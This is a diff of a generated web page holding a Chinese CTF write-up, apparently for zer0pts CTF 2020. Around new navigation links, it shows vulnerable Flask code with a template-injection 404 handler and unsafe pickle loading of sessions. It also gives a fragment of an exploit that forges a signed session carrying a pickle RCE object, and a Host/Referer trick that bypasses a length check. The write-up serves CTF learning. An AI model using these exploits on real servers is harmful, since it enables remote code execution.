@@ -592,6 +592,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2020_Hackergame/" title="Hackergame 2020" class="md-nav__link">
+      Hackergame 2020
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -777,26 +789,26 @@
 <p>给了源码 大概有两个地方可能有洞</p>
 <h3 id="python">Python 模版注入<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
 <p><div class="highlight"><pre><span></span><code><span class="err">。。。。。。。</span>
-<span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
     <span class="sd">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span>
     <span class="n">referrer</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;Referer&quot;</span><span class="p">)</span>
 
-    <span class="k">if</span> <span class="n">referrer</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span> <span class="n">referrer</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
+    <span class="k">if</span> <span class="n">referrer</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="n">referrer</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="n">valid_url</span><span class="p">(</span><span class="n">referrer</span><span class="p">):</span> <span class="n">referrer</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
 
-    <span class="n">html</span> <span class="o">=</span> <span class="s1">&#39;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL={}&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">referrer</span><span class="p">)</span>
+    <span class="n">html</span> <span class="o">=</span> <span class="s1">&#39;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=</span><span class="si">{}</span><span class="s1">&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">referrer</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">html</span><span class="p">),</span> <span class="mi">404</span>
 <span class="k">def</span> <span class="nf">valid_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
     <span class="sd">&quot;&quot;&quot; Check if given url is valid &quot;&quot;&quot;</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">  url = &quot;</span><span class="o">+</span><span class="n">url</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">  url = &quot;</span><span class="o">+</span><span class="n">url</span><span class="p">)</span>
     <span class="n">host</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span>
 
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">host</span><span class="p">):</span> <span class="k">return</span> <span class="bp">False</span>  <span class="c1"># Not from my server</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span> <span class="c1"># Referer may be also 404</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">host</span><span class="p">):</span> <span class="k">return</span> <span class="kc">False</span>  <span class="c1"># Not from my server</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span> <span class="c1"># Referer may be also 404</span>
 
-    <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="kc">True</span>
 <span class="err">。。。。。。</span>
 </code></pre></div>
 看起来404页面可以SSTI,而且看源码没waf没过滤,但是有个 长度限制
@@ -805,7 +817,7 @@
 <p><div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">load</span><span class="p">():</span>
     <span class="sd">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">savedata</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;savedata&#39;</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+        <span class="n">savedata</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;savedata&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
         <span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">savedata</span><span class="p">))</span>
     <span class="k">except</span><span class="p">:</span>
         <span class="n">data</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&quot;date&quot;</span><span class="p">:</span> <span class="n">now</span><span class="p">(),</span> <span class="s2">&quot;text&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;*New Note*&quot;</span><span class="p">}]</span>
@@ -831,7 +843,7 @@
 
 <span class="k">class</span> <span class="nc">App</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
     <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="kc">None</span>
 
 <span class="n">app</span> <span class="o">=</span> <span class="n">App</span><span class="p">()</span>
 <span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">&#39;*</span><span class="se">\x14</span><span class="s1">{</span><span class="se">\xa0</span><span class="s1">Hu</span><span class="se">\xcb\xa6\xdc\x9c\r\xf7</span><span class="s1">Fd</span><span class="se">\xd2\xaf</span><span class="s1">&#39;</span>
@@ -840,7 +852,7 @@
 <span class="n">serializer</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
 
 <span class="n">session</span> <span class="o">=</span> <span class="n">serializer</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s1">&#39;savedata&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">PickleRce</span><span class="p">()))})</span>
-<span class="k">print</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
 <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://192.168.10.132:7010/note/1&#39;</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
     <span class="s1">&#39;session&#39;</span><span class="p">:</span> <span class="n">session</span>
 <span class="p">})</span>
@@ -873,8 +885,8 @@ flask.request.host_url <span class="o">====</span>&gt;   http://0.0.0.0:8001/?ho
 </code></pre></div>
 
 <p>长度判断代码
-<div class="highlight"><pre><span></span><code>    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">host</span><span class="p">):</span> <span class="k">return</span> <span class="bp">False</span>  <span class="c1"># Not from my server</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span> <span class="c1"># Referer may be also 404</span>
+<div class="highlight"><pre><span></span><code>    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">host</span><span class="p">):</span> <span class="k">return</span> <span class="kc">False</span>  <span class="c1"># Not from my server</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span> <span class="c1"># Referer may be also 404</span>
 </code></pre></div>
 它计算的是<code>Host</code>和<code>Referer</code>的差，而且 url的开头与host有个比较，那我们改个请求包的<code>Host</code>和<code>Referer</code> 就可以绕过长度限制惹</p>
 <p><img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020zer0ptsCTF/2.png" tag="1" /></p>
@@ -1070,13 +1082,13 @@ setbit 1111111111111111 5 1
           </a>
         
         
-          <a href="../../vulhub/narak/" title="narak" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../2020_Hackergame/" title="Hackergame 2020" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                narak
+                Hackergame 2020
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
